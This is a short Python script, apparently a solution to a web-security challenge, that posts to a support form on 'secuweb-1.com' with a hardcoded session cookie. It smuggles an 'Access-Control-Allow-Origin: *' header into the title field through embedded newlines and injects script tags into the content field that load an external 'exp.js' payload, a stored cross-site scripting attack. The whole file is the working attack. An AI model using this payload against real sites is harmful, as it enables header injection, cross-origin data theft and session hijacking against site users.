from requests import get, post

headers = {
	'Cookie': 'token=a6de6ffba2040055e3ba861aae1f9953012c48cc; user_id=junoim;'
}

data ={
	'title': 'last\nAccess-Control-Allow-Origin: *\n',
	'content': '''
	<script src="//code.jquery.com/jquery-3.2.1.min.js"></script>
<script src="http://localhost/exploit/exp.js"></script>
'''
}

c = post("http://secuweb-1.com/support.php", headers=headers, data=data)

print c.content